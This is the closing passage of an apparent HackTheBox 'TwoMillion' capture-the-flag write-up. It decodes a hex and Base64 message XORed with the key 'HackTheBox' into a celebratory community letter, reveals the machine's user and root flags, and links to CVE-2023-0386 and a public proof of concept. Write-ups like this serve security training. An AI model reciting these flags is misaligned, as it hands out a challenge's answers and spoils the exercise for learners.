050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}"}
```

This time its `hex` encoded, Decoding this in cyberchef again we get the following
```text
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
```

This time, it looks like the result was both encoded in `Base64` and `XORed` with the key `HackTheBox`. We can decode this even more with CyberChef if we choose the From `Base64` and `XOR` operations, give `HackTheBox` as the `XOR key`, and then set the encoding to `UTF8`. The last message is shown below.

```Text
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of
cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```


<details>
  <summary>Click to reveal flags</summary>
  User: 451a6faccb369923269e552bcb6b4745
  Root: 7232e939e57ccedb34fb9de096f7e134
</details>

## References :

- [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- [Ubuntu articles](https://ubuntu.com/security/CVE-2023-0386)
- [Github PoC](https://github.com/xkaneiki/CVE-2023-0386)
